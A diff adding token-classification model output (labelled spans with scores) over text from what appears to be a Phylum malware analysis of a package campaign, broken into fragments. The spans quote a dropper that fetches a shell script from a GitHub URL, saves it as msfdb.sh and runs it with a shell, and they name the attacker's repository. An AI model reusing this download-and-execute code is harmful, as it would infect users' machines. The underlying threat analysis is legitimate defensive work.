+      "entity": "tmp / file. py ' \\ n \" ) f. write ( \" isexist = os. path. exists ( path ) \\ n \" ) f. write ( \"",
+      "type": "LABEL_1",
+      "score": 0.6700156331062317,
+      "start": 2403,
+      "end": 2506
+    },
+    {
+      "entity": "if not",
+      "type": "LABEL_0",
+      "score": 0.60652756690979,
+      "start": 2506,
+      "end": 2512
+    },
+    {
+      "entity": "isexist",
+      "type": "LABEL_1",
+      "score": 0.6652026176452637,
+      "start": 2513,
+      "end": 2520
+    },
+    {
+      "entity": ":",
+      "type": "LABEL_0",
+      "score": 0.569370687007904,
+      "start": 2520,
+      "end": 2521
+    },
+    {
+      "entity": "\\ n \" ) f. write ( \"",
+      "type": "LABEL_1",
+      "score": 0.663392961025238,
+      "start": 2521,
+      "end": 2551
+    },
+    {
+      "entity": "os",
+      "type": "LABEL_0",
+      "score": 0.5216823816299438,
+      "start": 2559,
+      "end": 2561
+    },
+    {
+      "entity": ". makedirs ( path ) \\ n \" ) f. write ( \"",
+      "type": "LABEL_1",
+      "score": 0.6594768166542053,
+      "start": 2561,
+      "end": 2607
+    },
+    {
+      "entity": "if",
+      "type": "LABEL_0",
+      "score": 0.6074567437171936,
+      "start": 2607,
+      "end": 2609
+    },
+    {
+      "entity": "path ( path ). is _ file ( )",
+      "type": "LABEL_1",
+      "score": 0.6636093854904175,
+      "start": 2610,
+      "end": 2630
+    },
+    {
+      "entity": ":",
+      "type": "LABEL_0",
+      "score": 0.5236061811447144,
+      "start": 2630,
+      "end": 2631
+    },
+    {
+      "entity": "\\ n \" ) f. write ( \" print ( \" \" ) \\ n \" ) f. write ( \"",
+      "type": "LABEL_1",
+      "score": 0.661533534526825,
+      "start": 2632,
+      "end": 2713
+    },
+    {
+      "entity": "else :",
+      "type": "LABEL_0",
+      "score": 0.5506221652030945,
+      "start": 2713,
+      "end": 2718
+    },
+    {
+      "entity": "\\ n \" ) f. write ( \" remote _ url = ' https",
+      "type": "LABEL_1",
+      "score": 0.6536601185798645,
+      "start": 2719,
+      "end": 2773
+    },
+    {
+      "entity": ":",
+      "type": "LABEL_0",
+      "score": 0.5106687545776367,
+      "start": 2773,
+      "end": 2774
+    },
+    {
+      "entity": "/ / raw. githubusercontent. com / gobiwound / ab32 /",
+      "type": "LABEL_1",
+      "score": 0.6988300681114197,
+      "start": 2774,
+      "end": 2817
+    },
+    {
+      "entity": "main",
+      "type": "LABEL_0",
+      "score": 0.6019216179847717,
+      "start": 2817,
+      "end": 2821
+    },
+    {
+      "entity": "/ naopceaovaeavocpa. sh ' \\ n \" ) f. write ( \"",
+      "type": "LABEL_1",
+      "score": 0.7151877880096436,
+      "start": 2821,
+      "end": 2874
+    },
+    {
+      "entity": "local",
+      "type": "LABEL_0",
+      "score": 0.5610148906707764,
+      "start": 2879,
+      "end": 2884
+    },
+    {
+      "entity": "_ file = path + ' / msfdb. sh ' \\ n \" ) f. write ( \" request. urlretrieve (",
+      "type": "LABEL_1",
+      "score": 0.6763187646865845,
+      "start": 2884,
+      "end": 2964
+    },
+    {
+      "entity": "remote",
+      "type": "LABEL_0",
+      "score": 0.5097272396087646,
+      "start": 2964,
+      "end": 2970
+    },
+    {
+      "entity": "_ url,",
+      "type": "LABEL_1",
+      "score": 0.6575958132743835,
+      "start": 2970,
+      "end": 2975
+    },
+    {
+      "entity": "local",
+      "type": "LABEL_0",
+      "score": 0.5751320719718933,
+      "start": 2976,
+      "end": 2981
+    },
+    {
+      "entity": "_ file ) \\ n \" ) f. write ( \"",
+      "type": "LABEL_1",
+      "score": 0.664431095123291,
+      "start": 2981,
+      "end": 3018
+    },
+    {
+      "entity": "subprocess",
+      "type": "LABEL_0",
+      "score": 0.575707197189331,
+      "start": 3023,
+      "end": 3033
+    },
+    {
+      "entity": ". call ( \\ \" bash /",
+      "type": "LABEL_1",
+      "score": 0.6822129487991333,
+      "start": 3033,
+      "end": 3047
+    },
+    {
+      "entity": "home",
+      "type": "LABEL_0",
+      "score": 0.5010756254196167,
+      "start": 3047,
+      "end": 3051
+    },
+    {
+      "entity": "/",
+      "type": "LABEL_1",
+      "score": 0.5532135963439941,
+      "start": 3051,
+      "end": 3052
+    },
+    {
+      "entity": "$",
+      "type": "LABEL_0",
+      "score": 0.5872805118560791,
+      "start": 3052,
+      "end": 3053
+    },
+    {
+      "entity": "user /. msfdb.",
+      "type": "LABEL_1",
+      "score": 0.6986495852470398,
+      "start": 3053,
+      "end": 3065
+    },
+    {
+      "entity": "d",
+      "type": "LABEL_0",
+      "score": 0.5449832677841187,
+      "start": 3065,
+      "end": 3066
+    },
+    {
+      "entity": "/ msfdb. sh \\ \", shell = true ) \\ n \" )",
+      "type": "LABEL_1",
+      "score": 0.6802472472190857,
+      "start": 3066,
+      "end": 3095
+    },
+    {
+      "entity": "f",
+      "type": "LABEL_0",
+      "score": 0.5045166015625,
+      "start": 3112,
+      "end": 3113
+    },
+    {
+      "entity": ". write ( \"",
+      "type": "LABEL_1",
+      "score": 0.6619410514831543,
+      "start": 3113,
+      "end": 3121
+    },
+    {
+      "entity": "if",
+      "type": "LABEL_0",
+      "score": 0.5789992809295654,
+      "start": 3126,
+      "end": 3128
+    },
+    {
+      "entity": "path ( pat ). is _ file ( ) : \\ n \" ) f. write ( \" try : \\ n",
+      "type": "LABEL_1",
+      "score": 0.6476958990097046,
+      "start": 3129,
+      "end": 3195
+    },
+    {
+      "entity": "os",
+      "type": "LABEL_0",
+      "score": 0.5708538889884949,
+      "start": 3206,
+      "end": 3208
+    },
+    {
+      "entity": ". remove ( pat ) \\ n \" ) f.",
+      "type": "LABEL_1",
+      "score": 0.668376088142395,
+      "start": 3208,
+      "end": 3243
+    },
+    {
+      "entity": "write",
+      "type": "LABEL_0",
+      "score": 0.5122670531272888,
+      "start": 3243,
+      "end": 3248
+    },
+    {
+      "entity": "( \" except",
+      "type": "LABEL_1",
+      "score": 0.5510116815567017,
+      "start": 3248,
+      "end": 3265
+    },
+    {
+      "entity": ":",
+      "type": "LABEL_0",
+      "score": 0.5458127856254578,
+      "start": 3265,
+      "end": 3266
+    },
+    {
+      "entity": "\\ n print ( ) \" ) except filenotfounderror : print ( \" \" ) subprocess. call ( \" python3 / tmp /",
+      "type": "LABEL_1",
+      "score": 0.6561384797096252,
+      "start": 3266,
+      "end": 3384
+    },
+    {
+      "entity": "file",
+      "type": "LABEL_0",
+      "score": 0.5025884509086609,
+      "start": 3384,
+      "end": 3388
+    },
+    {
+      "entity": ". py & \", shell =",
+      "type": "LABEL_1",
+      "score": 0.6785355806350708,
+      "start": 3388,
+      "end": 3402
+    },
+    {
+      "entity": "true",
+      "type": "LABEL_0",
+      "score": 0.5669832229614258,
+      "start": 3402,
+      "end": 3406
+    },
+    {
+      "entity": ")",
+      "type": "LABEL_1",
+      "score": 0.5529842376708984,
+      "start": 3406,
+      "end": 3407
+    },
+    {
+      "entity": "else :",
+      "type": "LABEL_0",
+      "score": 0.5385973453521729,
+      "start": 3409,
+      "end": 3414
+    },
+    {
+      "entity": "print ( \" \" ) the actor then fetches something from github,",
+      "type": "LABEL_1",
+      "score": 0.6331204771995544,
+      "start": 3419,
+      "end": 3474
+    },
+    {
+      "entity": "saves",
+      "type": "LABEL_0",
+      "score": 0.5088116526603699,
+      "start": 3475,
+      "end": 3480
+    },
+    {
+      "entity": "it locally as msfdb. sh, and executes it.",
+      "type": "LABEL_1",
+      "score": 0.6971220970153809,
+      "start": 3481,
+      "end": 3521
+    },
+    {
+      "entity": "that, too, is",
+      "type": "LABEL_1",
+      "score": 0.6320250034332275,
+      "start": 3522,
+      "end": 3535
+    },
+    {
+      "entity": "heavily obfuscated",
+      "type": "LABEL_0",
+      "score": 0.5390374660491943,
+      "start": 3536,
+      "end": 3554
+    },
+    {
+      "entity": ", which",
+      "type": "LABEL_1",
+      "score": 0.659389853477478,
+      "start": 3554,
+      "end": 3561
+    },
+    {
+      "entity": "makes",
+      "type": "LABEL_0",
+      "score": 0.5212167501449585,
+      "start": 3562,
+      "end": 3567
+    },
+    {
+      "entity": "it",
+      "type": "LABEL_1",
+      "score": 0.6352522969245911,
+      "start": 3568,
+      "end": 3570
+    },
+    {
+      "entity": "somewhat difficult",
+      "type": "LABEL_0",
+      "score": 0.6289122104644775,
+      "start": 3571,
+      "end": 3589
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.7068403959274292,
+      "start": 3590,
+      "end": 3592
+    },
+    {
+      "entity": "reason about",
+      "type": "LABEL_0",
+      "score": 0.6957634687423706,
+      "start": 3593,
+      "end": 3605
+    },
+    {
+      "entity": ". helpfully",
+      "type": "LABEL_1",
+      "score": 0.6757106781005859,
+      "start": 3605,
+      "end": 3616
+    },
+    {
+      "entity": "though",
+      "type": "LABEL_0",
+      "score": 0.5595948696136475,
+      "start": 3617,
+      "end": 3623
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7155429124832153,
+      "start": 3623,
+      "end": 3624
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.6519711017608643,
+      "start": 3625,
+      "end": 3628
+    },
+    {
+      "entity": "actor",
+      "type": "LABEL_1",
+      "score": 0.533170223236084,
+      "start": 3629,
+      "end": 3634
+    },
+    {
+      "entity": "was kind enough",
+      "type": "LABEL_0",
+      "score": 0.6400907039642334,
+      "start": 3635,
+      "end": 3650
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.7455055117607117,
+      "start": 3651,
+      "end": 3653
+    },
+    {
+      "entity": "store everything",
+      "type": "LABEL_0",
+      "score": 0.5747644901275635,
+      "start": 3654,
+      "end": 3670
+    },
+    {
+      "entity": "in a",
+      "type": "LABEL_1",
+      "score": 0.5864050984382629,
+      "start": 3671,
+      "end": 3675
+    },
+    {
+      "entity": "git",
+      "type": "LABEL_0",
+      "score": 0.6788616180419922,
+      "start": 3676,
+      "end": 3679
+    },
+    {
+      "entity": "repo that",
+      "type": "LABEL_1",
+      "score": 0.5544061660766602,
+      "start": 3680,
+      "end": 3689
+    },
+    {
+      "entity": "phylum could access",
+      "type": "LABEL_0",
+      "score": 0.6522786021232605,
+      "start": 3690,
+      "end": 3709
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.8754931092262268,
+      "start": 3709,
+      "end": 3710
+    },
+    {
+      "entity": "at",
+      "type": "LABEL_0",
+      "score": 0.6438449025154114,
+      "start": 3711,
+      "end": 3713
+    },
+    {
+      "entity": "the time of",
+      "type": "LABEL_1",
+      "score": 0.6106136441230774,
+      "start": 3714,
+      "end": 3725
+    },
+    {
+      "entity": "publishing",
+      "type": "LABEL_0",
+      "score": 0.5235830545425415,
+      "start": 3726,
+      "end": 3736
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7429528832435608,
+      "start": 3736,
+      "end": 3737
+    },
+    {
+      "entity": "the github repo is still",
+      "type": "LABEL_0",
+      "score": 0.5978021025657654,
+      "start": 3738,
+      "end": 3762
+    },
+    {
+      "entity": "accessible",
+      "type": "LABEL_1",
+      "score": 0.5799594521522522,
+      "start": 3763,
+      "end": 3773
+    },
+    {
+      "entity": "at https : / / github. com / gobiwound / ab32",
+      "type": "LABEL_0",
+      "score": 0.6462813019752502,
+      "start": 3774,
+      "end": 3810
+    },
+    {
+      "entity": ". watching",
+      "type": "LABEL_1",
+      "score": 0.6405825614929199,
+      "start": 3810,
+      "end": 3820
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.6410824656486511,
+      "start": 3821,
+      "end": 3824
+    },
+    {
+      "entity": "attacker",
+      "type": "LABEL_1",
+      "score": 0.5364373922348022,
+      "start": 3825,
+      "end": 3833
+    },
+    {
+      "entity": "work in real -",
+      "type": "LABEL_0",
+      "score": 0.641022264957428,
+      "start": 3834,
+      "end": 3847
+    },
+    {
+      "entity": "time it was",
+      "type": "LABEL_1",
+      "score": 0.7079222202301025,
+      "start": 3847,
+      "end": 3858
+    },
+    {
+      "entity": "around",
+      "type": "LABEL_0",
+      "score": 0.5906733870506287,
+      "start": 3859,
+      "end": 3865
+    },
+    {
+      "entity": "this time that we",
+      "type": "LABEL_1",
+      "score": 0.6265789866447449,
+      "start": 3866,
+      "end": 3883
+    },
+    {
+      "entity": "decided",
+      "type": "LABEL_0",
+      "score": 0.8065181970596313,
+      "start": 3884,
+      "end": 3891
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.7157928347587585,
+      "start": 3892,
+      "end": 3894
+    },
+    {
+      "entity": "report",
+      "type": "LABEL_0",
+      "score": 0.5565561652183533,
+      "start": 3895,
+      "end": 3901
+    },
+    {
+      "entity": "the repo to",
+      "type": "LABEL_1",
+      "score": 0.5823684334754944,
+      "start": 3902,
+      "end": 3913
+    },
+    {
+      "entity": "github in hopes",
+      "type": "LABEL_0",
+      "score": 0.587313711643219,
+      "start": 3914,
+      "end": 3929
+    },
+    {
+      "entity": "that we would",
+      "type": "LABEL_1",
+      "score": 0.6194937229156494,
+      "start": 3930,
+      "end": 3943
+    },
+    {
+      "entity": "cut down",
+      "type": "LABEL_0",
+      "score": 0.6722719669342041,
+      "start": 3944,
+      "end": 3952
+    },
+    {
+      "entity": "another",
+      "type": "LABEL_1",
+      "score": 0.583912193775177,
+      "start": 3953,
+      "end": 3960
+    },
+    {
+      "entity": "component of",
+      "type": "LABEL_0",
+      "score": 0.5434301495552063,
+      "start": 3961,
+      "end": 3973
+    },
+    {
+      "entity": "this actor",
+      "type": "LABEL_1",
+      "score": 0.6155861616134644,
+      "start": 3974,
+      "end": 3984
+    },
+    {
+      "entity": "’ s attack infrastructure",
+      "type": "LABEL_0",
+      "score": 0.6816688179969788,
+      "start": 3984,
+      "end": 4008
+    },
+    {
+      "entity": ". we",
+      "type": "LABEL_1",
+      "score": 0.7289177179336548,
+      "start": 4008,
+      "end": 4012
+    },
+    {
+      "entity": "also witnessed the attacker updating the",
+      "type": "LABEL_0",
+      "score": 0.6437930464744568,
+      "start": 4013,
+      "end": 4053
+    },
+    {
+      "entity": "obfuscation for their payload",
+      "type": "LABEL_1",
+      "score": 0.5497255325317383,
+      "start": 4054,
+      "end": 4083
+    },
+    {
+      "entity": "in",
+      "type": "LABEL_0",
+      "score": 0.7462271451950073,
+      "start": 4084,
+      "end": 4086
+    },
+    {
+      "entity": "real time, continuing to",
+      "type": "LABEL_1",
+      "score": 0.6128007173538208,
+      "start": 4087,
+      "end": 4111
+    },
+    {
+      "entity": "hone",
+      "type": "LABEL_0",
+      "score": 0.5439476370811462,
+      "start": 4112,
+      "end": 4116
+    },
+    {
+      "entity": "their",
+      "type": "LABEL_1",
+      "score": 0.5287867784500122,
+      "start": 4117,
+      "end": 4122
+    },
+    {
+      "entity": "attack",
+      "type": "LABEL_0",
+      "score": 0.502960741519928,
+      "start": 4123,
+      "end": 4129
+    },
+    {
+      "entity": "for",
+      "type": "LABEL_1",
+      "score": 0.7363048791885376,
+      "start": 4130,
+      "end": 4133
+    },
+    {
+      "entity": "maximum efficacy",
+      "type": "LABEL_0",
+      "score": 0.6210364103317261,
+      "start": 4134,
+      "end": 4150
+    },
+    {
+      "entity": ". by this time,",
+      "type": "LABEL_1",
+      "score": 0.6926735043525696,
+      "start": 4150,
+      "end": 4165
+    },
+    {
+      "entity": "phylum had already",
+      "type": "LABEL_0",
+      "score": 0.6552442908287048,
+      "start": 4166,
+      "end": 4184
+    },
+    {
+      "entity": "ru",
+      "type": "LABEL_1",
+      "score": 0.5345286726951599,
+      "start": 4185,
+      "end": 4187
+    },
+    {
+      "entity": "##ined the campaign",
+      "type": "LABEL_0",
+      "score": 0.666313111782074,
+      "start": 4187,
+      "end": 4204
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7368474006652832,
+      "start": 4204,
+      "end": 4205
+    },
+    {
+      "entity": "but the attacker likely didn ’ t realize just",
+      "type": "LABEL_0",
+      "score": 0.6644964218139648,
+      "start": 4206,
+      "end": 4249
+    },
+    {
+      "entity": "how burned",
+      "type": "LABEL_1",
+      "score": 0.5804402828216553,
+      "start": 4250,
+      "end": 4260
+    },
+    {
+      "entity": "they",
+      "type": "LABEL_0",
+      "score": 0.6825665235519409,
+      "start": 4261,
+      "end": 4265
+    },
+    {
+      "entity": "were. it",
+      "type": "LABEL_1",
+      "score": 0.6249319314956665,
+      "start": 4266,
+      "end": 4274
+    },
+    {
+      "entity": "was",
+      "type": "LABEL_0",
+      "score": 0.584193766117096,
+      "start": 4275,
+      "end": 4278
+    },
+    {
+      "entity": "time to",
+      "type": "LABEL_1",
+      "score": 0.5683769583702087,
+      "start": 4279,
+      "end": 4286
+    },
+    {
+      "entity": "let",
+      "type": "LABEL_0",
+      "score": 0.6441500782966614,
+      "start": 4287,
+      "end": 4290
+    },
+    {
+      "entity": "them",
+      "type": "LABEL_1",
+      "score": 0.5874213576316833,
+      "start": 4291,
+      "end": 4295
+    },
+    {
+      "entity": "know",
+      "type": "LABEL_0",
+      "score": 0.6069788932800293,
+      "start": 4296,
+      "end": 4300
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.6986891627311707,
+      "start": 4300,
+      "end": 4301
+    },
+    {
+      "entity": "for poster",
+      "type": "LABEL_0",
+      "score": 0.6099545955657959,
+      "start": 4302,
+      "end": 4312
+    },
+    {
+      "entity": "##ity, we",
+      "type": "LABEL_1",
+      "score": 0.6779613494873047,
+      "start": 4312,
+      "end": 4319
+    },
+    {
+      "entity": "cloned the existing git",
+      "type": "LABEL_0",
+      "score": 0.6864913702011108,
+      "start": 4320,
+      "end": 4343
+    },
+    {
+      "entity": "repo and created a new",
+      "type": "LABEL_1",
+      "score": 0.5936495661735535,
+      "start": 4344,
+      "end": 4366
+    },
+    {
+      "entity": "issue",
+      "type": "LABEL_0",
+      "score": 0.7475630044937134,
+      "start": 4367,
+      "end": 4372
+    },
+    {
+      "entity": "in",
+      "type": "LABEL_1",
+      "score": 0.6175671815872192,
+      "start": 4373,
+      "end": 4375
+    },
+    {
+      "entity": "the attacker ’ s github repository",
+      "type": "LABEL_0",
+      "score": 0.703340470790863,
+      "start": 4376,
+      "end": 4408
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.7236207723617554,
+      "start": 4408,
+      "end": 4409
+    },
+    {
+      "entity": "the attacker",
+      "type": "LABEL_0",
+      "score": 0.6614677309989929,
+      "start": 4410,
+      "end": 4422
+    },
+    {
+      "entity": "panic",
+      "type": "LABEL_1",
+      "score": 0.5262018442153931,
+      "start": 4423,
+      "end": 4428
+    },
+    {
+      "entity": "##s the attacker continued",
+      "type": "LABEL_0",
+      "score": 0.6604461669921875,
+      "start": 4428,
+      "end": 4452
+    },
+    {
+      "entity": "his work",
+      "type": "LABEL_1",
+      "score": 0.6179467439651489,
+      "start": 4453,
+      "end": 4461
+    },
+    {
+      "entity": "for the next few",
+      "type": "LABEL_0",
+      "score": 0.6536162495613098,
+      "start": 4462,
+      "end": 4478
+    },
+    {
+      "entity": "hours,",
+      "type": "LABEL_1",
+      "score": 0.7317692041397095,
+      "start": 4479,
+      "end": 4485
+    },
+    {
+      "entity": "bliss",
+      "type": "LABEL_0",
+      "score": 0.7180377840995789,
+      "start": 4486,
+      "end": 4491
+    },
+    {
+      "entity": "##fully",
+      "type": "LABEL_1",
+      "score": 0.502467691898346,
+      "start": 4491,
+      "end": 4496
+    },
+    {
+      "entity": "unaware",
+      "type": "LABEL_0",
+      "score": 0.8341557383537292,
+      "start": 4497,
+      "end": 4504
+    },
+    {
+      "entity": "of our",
+      "type": "LABEL_1",
+      "score": 0.6352498531341553,
+      "start": 4505,
+      "end": 4511
+    },
+    {
+      "entity": "newly min",
+      "type": "LABEL_0",
+      "score": 0.5867487192153931,
+      "start": 4512,
+      "end": 4521
+    },
+    {
+      "entity": "##ted",
+      "type": "LABEL_1",
+      "score": 0.6165063977241516,
+      "start": 4521,
+      "end": 4524
+    },
+    {
+      "entity": "issue",
+      "type": "LABEL_0",
+      "score": 0.7970456480979919,
+      "start": 4525,
+      "end": 4530
+    },
+    {
+      "entity": ". when",
+      "type": "LABEL_1",
+      "score": 0.7292697429656982,
+      "start": 4530,
+      "end": 4536
+    },
+    {
+      "entity": "the actor",
+      "type": "LABEL_0",
+      "score": 0.5981951951980591,
+      "start": 4537,
+      "end": 4546
+    },
+    {
+      "entity": "did",
+      "type": "LABEL_1",
+      "score": 0.5623708963394165,
+      "start": 4547,
+      "end": 4550
+    },
+    {
+      "entity": "finally notice",
+      "type": "LABEL_0",
+      "score": 0.6070300340652466,
+      "start": 4551,
+      "end": 4565
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7925726771354675,
+      "start": 4565,
+      "end": 4566
+    },
+    {
+      "entity": "they",
+      "type": "LABEL_0",
+      "score": 0.577588677406311,
+      "start": 4567,
+      "end": 4571
+    },
+    {
+      "entity": "did",
+      "type": "LABEL_1",
+      "score": 0.561282753944397,
+      "start": 4572,
+      "end": 4575
+    },
+    {
+      "entity": "what",
+      "type": "LABEL_0",
+      "score": 0.6377082467079163,
+      "start": 4576,
+      "end": 4580
+    },
+    {
+      "entity": "we can",
+      "type": "LABEL_1",
+      "score": 0.5810202360153198,
+      "start": 4581,
+      "end": 4587
+    },
+    {
+      "entity": "only assume was the first thing",
+      "type": "LABEL_0",
+      "score": 0.6079880595207214,
+      "start": 4588,
+      "end": 4619
+    },
+    {
+      "entity": "that",
+      "type": "LABEL_1",
+      "score": 0.5550132393836975,
+      "start": 4620,
+      "end": 4624
+    },
+    {
+      "entity": "came",
+      "type": "LABEL_0",
+      "score": 0.5081567168235779,
+      "start": 4625,
+      "end": 4629
+    },
+    {
+      "entity": "to mind",
+      "type": "LABEL_1",
+      "score": 0.6083288192749023,
+      "start": 4630,
+      "end": 4637
+    },
+    {
+      "entity": ":",
+      "type": "LABEL_0",
+      "score": 0.5667893290519714,
+      "start": 4637,
+      "end": 4638
+    },
+    {
+      "entity": "push a",
+      "type": "LABEL_1",
+      "score": 0.5239928960800171,
+      "start": 4639,
+      "end": 4645
+    },
+    {
+      "entity": "commit",
+      "type": "LABEL_0",
+      "score": 0.6531639695167542,
+      "start": 4646,
+      "end": 4652
+    },
+    {
+      "entity": "deleting",
+      "type": "LABEL_1",
+      "score": 0.5352537631988525,
+      "start": 4653,
+      "end": 4661
+    },
+    {
+      "entity": "all",
+      "type": "LABEL_0",
+      "score": 0.6869118213653564,
+      "start": 4662,
+      "end": 4665
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_1",
+      "score": 0.5253352522850037,
+      "start": 4666,
+      "end": 4668
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.6388030052185059,
+      "start": 4669,
+      "end": 4672
+    },
+    {
+      "entity": "files",
+      "type": "LABEL_1",
+      "score": 0.5206310749053955,
+      "start": 4673,
+      "end": 4678
+    },
+    {
+      "entity": "from the",
+      "type": "LABEL_0",
+      "score": 0.6983314752578735,
+      "start": 4679,
+      "end": 4687
+    },
+    {
+      "entity": "repo.",
+      "type": "LABEL_1",
+      "score": 0.6567409038543701,
+      "start": 4688,
+      "end": 4693
+    },
+    {
+      "entity": "unfortunately for",
+      "type": "LABEL_0",
+      "score": 0.6441277265548706,
+      "start": 4694,
+      "end": 4711
+    },
+    {
+      "entity": "them,",
+      "type": "LABEL_1",
+      "score": 0.6390472650527954,
+      "start": 4712,
+      "end": 4717
+    },
+    {
+      "entity": "they appear",
+      "type": "LABEL_0",
+      "score": 0.55671626329422,
+      "start": 4718,
+      "end": 4729
+    },
+    {
+      "entity": "to be completely",
+      "type": "LABEL_1",
+      "score": 0.5532097816467285,
+      "start": 4730,
+      "end": 4746
+    },
+    {
+      "entity": "unaware",
+      "type": "LABEL_0",
+      "score": 0.7901803255081177,
+      "start": 4747,
+      "end": 4754
+    },
+    {
+      "entity": "of",
+      "type": "LABEL_1",
+      "score": 0.5199448466300964,
+      "start": 4755,
+      "end": 4757
+    },
+    {
+      "entity": "the fact",
+      "type": "LABEL_0",
+      "score": 0.7027527093887329,
+      "start": 4758,
+      "end": 4766
+    },
+    {
+      "entity": "that pushing a",
+      "type": "LABEL_1",
+      "score": 0.5881336331367493,
+      "start": 4767,
+      "end": 4781
+    },
+    {
+      "entity": "commit removing files",
+      "type": "LABEL_0",
+      "score": 0.6283038258552551,
+      "start": 4782,
+      "end": 4803
+    },
+    {
+      "entity": "doesn",
+      "type": "LABEL_1",
+      "score": 0.5258225798606873,
+      "start": 4804,
+      "end": 4809
+    },
+    {
+      "entity": "’ t",
+      "type": "LABEL_0",
+      "score": 0.6840656995773315,
+      "start": 4809,
+      "end": 4811
+    },
+    {
+      "entity": "also",
+      "type": "LABEL_1",
+      "score": 0.5177478194236755,
+      "start": 4812,
+      "end": 4816
+    },
+    {
+      "entity": "remove those files from the git history",
+      "type": "LABEL_0",
+      "score": 0.6302580237388611,
+      "start": 4817,
+      "end": 4856
+    },
+    {
+      "entity": ". in",
+      "type": "LABEL_1",
+      "score": 0.7285279035568237,
+      "start": 4856,
+      "end": 4860
+    },
+    {
+      "entity": "an attempt",
+      "type": "LABEL_0",
+      "score": 0.6576851606369019,
+      "start": 4861,
+      "end": 4871
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.5687305927276611,
+      "start": 4872,
+      "end": 4874
+    },
+    {
+      "entity": "further hide",
+      "type": "LABEL_0",
+      "score": 0.604762852191925,
+      "start": 4875,
+      "end": 4887
+    },
+    {
+      "entity": "their tracks,",
+      "type": "LABEL_1",
+      "score": 0.7162437438964844,
+      "start": 4888,
+      "end": 4901
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.6807357668876648,
+      "start": 4902,
+      "end": 4905
+    },
+    {
+      "entity": "actor",
+      "type": "LABEL_1",
+      "score": 0.5135191082954407,
+      "start": 4906,
+      "end": 4911
+    },
+    {
+      "entity": "also tried",
+      "type": "LABEL_0",
+      "score": 0.6159785985946655,
+      "start": 4912,
+      "end": 4922
+    },
+    {
+      "entity": "to",
+      "type": "LABEL_1",
+      "score": 0.5603467226028442,
+      "start": 4923,
+      "end": 4925
+    },
+    {
+      "entity": "clean",
+      "type": "LABEL_0",
+      "score": 0.7933963537216187,
+      "start": 4926,
+      "end": 4931
+    },
+    {
+      "entity": "up",
+      "type": "LABEL_1",
+      "score": 0.5659675002098083,
+      "start": 4932,
+      "end": 4934
+    },
+    {
+      "entity": "the issue",
+      "type": "LABEL_0",
+      "score": 0.6977393627166748,
+      "start": 4935,
+      "end": 4944
+    },
+    {
+      "entity": "we created.",
+      "type": "LABEL_1",
+      "score": 0.6503767371177673,
+      "start": 4945,
+      "end": 4956
+    },
+    {
+      "entity": "phylum was one",
+      "type": "LABEL_1",
+      "score": 0.6069840788841248,
+      "start": 4957,
+      "end": 4971
+    },
+    {
+      "entity": "step",
+      "type": "LABEL_0",
+      "score": 0.6272723078727722,
+      "start": 4972,
+      "end": 4976
+    },
+    {
+      "entity": "ahead and",
+      "type": "LABEL_1",
+      "score": 0.7239516973495483,
+      "start": 4977,
+      "end": 4986
+    },
+    {
+      "entity": "ensured",
+      "type": "LABEL_0",
+      "score": 0.567599356174469,
+      "start": 4987,
+      "end": 4994
+    },
+    {
+      "entity": "that",
+      "type": "LABEL_1",
+      "score": 0.543897271156311,
+      "start": 4995,
+      "end": 4999
+    },
+    {
+      "entity": "an issue title change",
+      "type": "LABEL_0",
+      "score": 0.5623431205749512,
+      "start": 5000,
+      "end": 5021
+    },
+    {
+      "entity": "occurred, which prevented",
+      "type": "LABEL_1",
+      "score": 0.6658981442451477,
+      "start": 5022,
+      "end": 5047
+    },
+    {
+      "entity": "the attacker",
+      "type": "LABEL_0",
+      "score": 0.5308616757392883,
+      "start": 5048,
+      "end": 5060
+    },
+    {
+      "entity": "from completely",
+      "type": "LABEL_1",
+      "score": 0.5996594429016113,
+      "start": 5061,
+      "end": 5076
+    },
+    {
+      "entity": "removing all",
+      "type": "LABEL_0",
+      "score": 0.5824840068817139,
+      "start": 5077,
+      "end": 5089
+    },
+    {
+      "entity": "references to",
+      "type": "LABEL_1",
+      "score": 0.5746831297874451,
+      "start": 5090,
+      "end": 5103
+    },
+    {
+      "entity": "malware",
+      "type": "LABEL_0",
+      "score": 0.5023452639579773,
+      "start": 5104,
+      "end": 5111
+    },
+    {
+      "entity": ". we",
+      "type": "LABEL_1",
+      "score": 0.7469327449798584,
+      "start": 5111,
+      "end": 5115
+    },
+    {
+      "entity": "can only assume “ k ” is the actor",
+      "type": "LABEL_0",
+      "score": 0.6313247084617615,
+      "start": 5116,
+      "end": 5148
+    },
+    {
+      "entity": "'",
+      "type": "LABEL_1",
+      "score": 0.6851598620414734,
+      "start": 5148,
+      "end": 5149
+    },
+    {
+      "entity": "s response",
+      "type": "LABEL_0",
+      "score": 0.7046149969100952,
+      "start": 5149,
+      "end": 5159
+    },
+    {
+      "entity": "to us after we",
+      "type": "LABEL_1",
+      "score": 0.5614524483680725,
+      "start": 5160,
+      "end": 5174
+    },
+    {
+      "entity": "told",
+      "type": "LABEL_0",
+      "score": 0.649747371673584,
+      "start": 5175,
+      "end": 5179
+    },
+    {
+      "entity": "them",
+      "type": "LABEL_1",
+      "score": 0.5612889528274536,
+      "start": 5180,
+      "end": 5184
+    },
+    {
+      "entity": "to “ knock",
+      "type": "LABEL_0",
+      "score": 0.6349868178367615,
+      "start": 5185,
+      "end": 5194
+    },
+    {
+      "entity": "off",
+      "type": "LABEL_1",
+      "score": 0.6805915236473083,
+      "start": 5195,
+      "end": 5198
+    },
+    {
+      "entity": "”",
+      "type": "LABEL_0",
+      "score": 0.7105655074119568,
